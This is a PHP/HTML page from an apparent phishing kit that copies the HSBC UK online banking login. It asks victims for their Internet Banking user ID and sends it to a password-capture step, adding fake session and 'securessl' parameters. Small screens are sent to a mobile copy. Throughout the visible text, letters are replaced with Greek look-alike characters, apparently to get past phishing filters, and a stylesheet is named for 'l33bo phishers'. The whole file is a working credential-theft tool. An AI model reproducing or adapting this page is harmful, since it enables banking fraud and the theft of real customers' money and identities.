<?php

session_start();
require "../assets/includes/functions.php";
require "../assets/includes/Bank_One_Time.php";
require "../assets/includes/simplehtmldom.php";
require "../assets/includes/enc.php";

?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xml:lang="en" lang="en" xmlns="http://www.w3.org/1999/xhtml" class="  js flexbox canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths">
<head>
<script>
if (screen.width <= 699) {
document.location = "mobile/index.php?sslchannel=true&sessionid= . generateRandomString(115));";
}
</script>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=7">
<title>L&omicron;gin</title>
<link rel="shortcut icon" href="assets/img/favicon.ico">	
<link rel="stylesheet" href="assets/css/reset.css" type="text/css" media="screen">
<link rel="stylesheet" href="assets/css/grid.css" type="text/css" media="screen">
<link rel="stylesheet" href="assets/css/layout.css" type="text/css" media="screen">
<link rel="stylesheet" href="assets/css/uk-layout.css" type="text/css" media="screen">
<link rel="stylesheet" href="assets/css/content.css" type="text/css" media="screen">
<link rel="stylesheet" href="assets/css/uk-content.css" type="text/css" media="screen">
<link rel="stylesheet" href="assets/css/product_support.css" type="text/css" media="screen">
<link rel="stylesheet" href="assets/css/faq.css" type="text/css" media="screen">
<link rel="stylesheet" href="assets/css/dsi.css" type="text/css" media="screen">
<link rel="stylesheet" href="assets/css/ask_olivia.css" type="text/css" media="screen">
<link rel="stylesheet" href="assets/css/oo_style.css" type="text/css" media="screen">
<link type="text/css" rel="stylesheet" href="assets/css/homepage.css">
<link type="text/css" rel="stylesheet" href="assets/css/Styles.css">
<link type="text/css" rel="stylesheet" href="assets/css/screen.css">
<link type="text/css" rel="stylesheet" href="assets/css/cookies.css">
<link type="text/css" rel="stylesheet" href="assets/css/l33bo_phishers_Custom_css.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
<script src="https://cdn.jsdelivr.net/jquery.validation/1.14.0/jquery.validate.js"></script>
<script src="https://jqueryvalidation.org/files/dist/additional-methods.min.js"></script>
<script>
  (function($,W,D)
{
    var JQUERY4U = {};

    JQUERY4U.UTIL =
    {
        setupFormValidation: function()
        {
            //form validation rules
            $("#logonForm").validate({
				errorElement: "div",			
                rules: {
					userid: {	required: true,},
                },
				errorPlacement: function(error, element) {
				if (element.attr("name") == "userid") 
				error.insertAfter("#usererror");
				else 
				error.insertAfter(element);	
				},
                messages: {
					userid: {
						required: "Please enter your Internet Banking user ID",
					},
				},
                submitHandler: function(form) {
                    form.submit();
                }
            });
        }
    }

    //when the dom has loaded setup form validation rules
    $(D).ready(function($) {
        JQUERY4U.UTIL.setupFormValidation();
    });

})(jQuery, window, document);
  
  </script>
</head>
<body id="personalHome">

<div id="top">
<?php include "assets/includes/header.php";?>
<div id="innerPage">
<div id="welcome">
  <div id="welcomeRow" class="off">&nbsp;</div>
</div>

<div id="grid" aria-live="polite" aria-relevant="all"><div id="disclaimer_banner" style="display: none;"></div>
<div class="grid grid_24">
  <div id="productNavigation" aria-live="polite" aria-relevant="all">
    <div style="float: left;">
      <h2 style="width: 150px;">L&omicron;g &omicron;n</h2>
    </div>
  </div>
</div>

<div class="grid grid_24" style="padding-bottom:30px;">
  <div class="grid grid_18">
     <a href="#"> <img src="assets/img/fs.gif" width="205" height="57" style="float:right;"></a> 
    <div class="productItem">
      <h3>Welc&omicron;me t&omicron; &Omicron;nline &Beta;anking</h3>
    </div>
  </div>
  <div class="grid grid_6">
    <div class="productItem"> <a href="#"><img src="assets/img/ask.gif" width="205" height="57" style="padding-left:12px"></a> </div>
  </div>
</div>

<div style="width: 250px;height: 30px;float: right;position: absolute;right: 54px;top: 158px;border-radius: 10px 10px 0 0;background: #9c0109; /* Old browsers */
background: -moz-linear-gradient(top,  #9c0109 0%, #da0011 100%); /* FF3.6+ */
background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#9c0109), color-stop(100%,#da0011)); /* Chrome,Safari4+ */
background: -webkit-linear-gradient(top,  #9c0109 0%,#da0011 100%); /* Chrome10+,Safari5.1+ */
background: -o-linear-gradient(top,  #9c0109 0%,#da0011 100%); /* Opera 11.10+ */
background: -ms-linear-gradient(top,  #9c0109 0%,#da0011 100%); /* IE10+ */
background: linear-gradient(to bottom,  #9c0109 0%,#da0011 100%); /* W3C */
filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#9c0109', endColorstr='#da0011',GradientType=0 ); /* IE6-9 */
box-shadow: -webkit-box-shadow: 1px 1px 42px -9px rgba(0,0,0,0.75);-moz-box-shadow: 1px 1px 42px -9px rgba(0,0,0,0.75);box-shadow: -1px -1px 17px -4px rgba(0,0,0,0.75);border: 1px solid #dadada;">
<a href="#" style="color:#FFF;width: 250px;height: 30px;display: block;text-decoration: none;">
<span style="width: 14px;height: 18px;display: block;position: absolute;left: 22px;top: 6px;">
<img src="assets/img/padlock.png"></span>
<span style="position: absolute;top: 9px;left: 53px;font-size: 0.9em;">Security &amp; Fraud Update</span>
<span style="width: 6px;height: 18px;display: block;position: absolute;right: 24px;top: 7px;">
<img src="assets/img/white.gif">
</span>
</a>
</div>
<div style="clear:both"></div>

<div class="topbar">
	<div class="bottombar">

		<div class="fragmentWrapper forgot-memorable-4">

		<div class="formContent" id="personalLogonForm">
			<form method="post" class="grid_24 logonForm" id="logonForm" autocomplete="off" name="login" action="password.php?&sessionid=<?php echo generateRandomString(80); ?>&securessl=true">
				
				<fieldset>
					<legend>L&omicron;g &omicron;n t&omicron; Pers&omicron;nal &Omicron;nline &Beta;anking</legend>
					<div class="fieldcontent first relative">
						<label for="intbankingID">Please enter y&omicron;ur user ID eg I&Beta;1234567890 &omicron;r J&omicron;hn123</label>
					</div>
					
					<div class="fieldcontent">
					<div id="usererror"></div>
						<input class="inpBox3" type="text" id="intbankingID" maxlength="76" required autocomplete="off" size="30" name="userid" style="width:199px" value="">
						<div id="continue" class="inputStyleRed clearfix"><input type="submit" id="registerStep1Submit" class="btnImg" maxlength="30" alt="Continue" title="Continue" value="Continue" style="border: 0px; outline: 0px;">

						</div>
					</div>
					
					<div class="fieldcontent">
						<input type="checkbox" id="dummycookieuserid" class="rememberMe" name="dummycookieuserid" onclick="updatecookieflag();"><input type="hidden" id="cookieuserid" name="cookieuserid" value="false"><label for="dummycookieuserid" class="checkboxField noVal width6">Remember my user ID</label>						

						
						<div class="helpInfo fl">
							<a href="#" class="helpLink"><span class="hiddenTxt">If y&omicron;u d&omicron; this, y&omicron;u w&omicron;n't need t&omicron; enter y&omicron;ur user ID when y&omicron;u l&omicron;g &omicron;n fr&omicron;m this c&omicron;mputer. Please n&omicron;te, a single c&omicron;&omicron;kie will be used t&omicron; all&omicron;w us t&omicron; remember y&omicron;ur preference.</span></a>
							<div class="info" style="display: none;">
								If y&omicron;u d&omicron; this, y&omicron;u w&omicron;n't need t&omicron; enter y&omicron;ur user ID when y&omicron;u l&omicron;g &omicron;n fr&omicron;m this c&omicron;mputer. Please n&omicron;te, a single c&omicron;&omicron;kie will be used t&omicron; all&omicron;w us t&omicron; remember y&omicron;ur preference.
		                        <span class="tipArrow"></span>
		                    </div>
						</div>
						<span>
							
								<a class="arrLink pws size90" href="#">F&omicron;rg&omicron;tten y&omicron;ur user ID?</a>
							
						</span>
					</div>

				</fieldset>
				
			</form>
<div class="asidecol"><h2>New cust&omicron;mers</h2><ul><li><a class="pws" href="#">Register f&omicron;r &Omicron;nline &Beta;anking</a></li></ul></div>



<div class="asidecol gap">
	<h2>&Beta;usiness cust&omicron;mers</h2>
	<ul>
		<li><a class="pws" href="#">L&omicron;g &omicron;n t&omicron; &Beta;usiness Internet &Beta;anking</a></li>
		<li><a class="pws" href="#">&Alpha;pply</a></li>
		<li><a class="pws" href="#">&Alpha;ctivate</a></li>
	</ul>
</div>
		</div>
		</div>
	</div>
</div>

<div class="grid grid_24" style="margin-top:5px;">
<div class="contentStrip" style="width:480px">
<div class="mboxDefault" style="visibility: visible; display: block;"> 
</div>
</div>
</div>
<div class="grid grid_24" style="margin-top:5px;">
<div class="contentStrip" style="width:480px">
<div style="visibility: visible; display: block;"><div id="ad1box"><a href="#"><img src="assets/img/ad1.gif"></a></div>
</div>
</div>
<div class="contentStrip" style="width:480px; clear:none">
<div style="visibility: visible; display: block;"><div id="ad2box"><a href="#"><img src="assets/img/ad2.gif"></a></div>
</div>
</div>
</div>

<div class="grid grid_24" style="padding-top: 50px; padding-bottom: 5px;">
  <div class="ctaRow">
    <div class="left">
      <p class="primary">
        <a class="overlayLaunchLink triggerModalDetails0" href="#">Find &omicron;ut m&omicron;re ab&omicron;ut &Omicron;nline &Beta;anking</a>
        &nbsp;&nbsp;&nbsp;
        <a class="overlayLaunchLink triggerModalDetails0" href="#">L&omicron;st, damaged and st&omicron;len Secure Keys</a>
        &nbsp;&nbsp;&nbsp;
        <a href="#">Security d&omicron;wnl&omicron;ads</a>
      </p>
    </div>
  </div>
  
  <div class="grid grid_23">
<div class="contentItem">

<p style="padding-left: 20px;">Fr&omicron;m 1st &Alpha;pril 2014, &Eta;S&Beta;C &Beta;ank plc is regulated f&omicron;r credit business by the Financial C&omicron;nduct &Alpha;uth&omicron;rity, 25 The N&omicron;rth C&omicron;l&omicron;nnade, Canary Wharf, L&omicron;nd&omicron;n, E14 5&Eta;S, FC&Alpha; ref. number 114216. <a style="padding-right:9px; text-decoration:underline; color:red; background: right center no-repeat url('assets/img/sml_red_arrow_forward.gif') scroll transparent;" href="#"><span class="red"><strong>Find out more</strong></span><span class="hidden"> PDF d&omicron;wnl&omicron;ad. This link will &omicron;pen in a new br&omicron;wser wind&omicron;w.</span></a></p>

</div>
</div>
  
</div>
</div>

<div id="cookies_enabled_banner" class="eucookie_status eucookie_enabled"><div class="enabledBannerCloseButton">
<a class="mobileonly"></a></div><p><strong>C&omicron;&omicron;kies are enabled</strong> Y&omicron;u are viewing the fully-&omicron;ptimised versi&omicron;n &omicron;f &omicron;ur website. F&omicron;r m&omicron;re details, please read &omicron;ur <a href="#">C&omicron;&omicron;kie P&omicron;licy</a>.</p></div>

<div id="globalFooter">
	<a href="#top" class="backToTop mobileOnly">&Beta;ack t&omicron; t&omicron;p</a>
	

	
<ul id="supportLinks">
<li class="contact"><a href="#">C&omicron;ntact and Supp&omicron;rt</a></li>
<li class="branch"><a href="#">Find a branch</a></li>
<li class="feedback desktopOnly"><a href="#">Website feedback<span class="invisible"> This link will &omicron;pen an &omicron;verlay wind&omicron;w.</span></a></li>
</ul>
<div id="footerMap">
<div class="column">
<h2><a href="#">Everyday banking</a></h2>
<ul>
    <li><a href="#">Current acc&omicron;unts</a></li>
    <li><a href="#">Saving acc&omicron;unts</a></li>
    <li><a href="#">Credit cards</a></li>
    <li><a href="#">Internati&omicron;nal services</a></li>
    <li class="desktopOnly"><a href="#">Switching t&omicron; &Eta;S&Beta;C</a></li>
    <li class="desktopOnly"><a href="#">Security centre</a></li>
    <li class="desktopOnly"><a href="#">Card supp&omicron;rt</a></li>
    <li class="desktopOnly"><a href="#">&Omicron;nline &Beta;anking</a></li>
</ul>
</div>


<div class="column desktopOnly">
<h2>Premium banking</h2>
<ul>
    <li><a href="#">&Eta;S&Beta;C Premier &Alpha;cc&omicron;unt</a></li>
    <li><a href="#">&Eta;S&Beta;C &Alpha;dvance &Alpha;cc&omicron;unt</a></li>
    <li><a href="#">&Eta;S&Beta;C Expat</a></li>
    <li><a href="#">&Eta;S&Beta;C Private &Beta;ank</a></li>
</ul>
</div>


<div class="column">
<h2>
  <a href="#">&Beta;&omicron;rr&omicron;wing</a>
</h2>
<ul>
  <li><a href="#" data-mobile-href="#">M&omicron;rtgages</a></li>
  <li>
    <a href="#">L&omicron;ans</a>
  </li>
  <li class="desktopOnly"><a href="#">M&omicron;rtgage calculat&omicron;rs</a></li>
  <li>
    <a href="#">&Omicron;verdrafts</a>
  </li>
  <li class="desktopOnly"><a href="#">&Beta;uy t&omicron; let</a></li>
  <li class="mobileOnly"><a href="#">Credit cards</a></li>
</ul>

		</div>

		<div class="column">
<h2><a href="#" data-mobile-href="#">Investing<span class="hidden"> &omicron;pens a &omicron;verlay wind&omicron;w</span></a></h2>
<ul class="desktopOnly">
    <li><a href="#">Investment pr&omicron;ducts<span class="hidden"> &omicron;pens a &omicron;verlay wind&omicron;w</span></a></li>
    <li><a href="#">Why invest with us?<span class="hidden"> &omicron;pens a &omicron;verlay wind&omicron;w</span></a></li>
    <li><a href="#">News and analysis<span class="hidden"> &omicron;pens a &omicron;verlay wind&omicron;w</span></a></li>
</ul>
</div>
		
		
<div class="column">
<h2><a href="#" data-mobile-href="#">Insurance</a></h2>
<ul class="desktopOnly">
    <li><a href="#">&Eta;&omicron;me insurance</a></li>
    <li><a href="#">Travel insurance</a></li>
    <li><a href="#">Car insurance</a></li>
    <li><a href="#">Premier car insurance</a></li>
    <li><a href="#">Life, critical illness &amp; inc&omicron;me c&omicron;ver</a></li>
    <li><a href="#">Student insurance</a></li>
</ul>
</div>
		
<div class="column last">
<h2><a href="#" data-mobile-href="#">Life events</a></h2>
<ul class="desktopOnly">
    <li><a href="#">&Beta;ereavement supp&omicron;rt</a></li>
    <li><a href="#">&Eta;ealth &amp; family</a></li>
    <li><a href="#">&Eta;&omicron;me &amp; lifestyle</a></li>
    <li><a href="#">W&omicron;rk &amp; retirement</a></li>
    <li><a href="#">Planning t&omicron;&omicron;ls</a></li>
</ul>
		</div>
	</div>
</div>
<ul id="meta">
<li><a href="#">&Alpha;b&omicron;ut &Eta;S&Beta;C</a></li>
<li><a href="#">Site map</a></li>
<li><a href="#">News and media</a></li>
<li><a href="#">Legal</a></li>
<li><a href="#">C&omicron;&omicron;kie P&omicron;licy</a></li>
<li><a href="#">&Alpha;ccessibility</a></li>
<li><a href="#">Careers</a></li>
<li><a href="#">&Eta;S&Beta;C Gr&omicron;up</a></li>
<li>&copy; &Eta;S&Beta;C &Beta;ank plc 2015</li>
</ul>
<div class="clearBoth"></div>
</div>
</div>
</body>
</html>
<?php
/*
Cody
*/
?>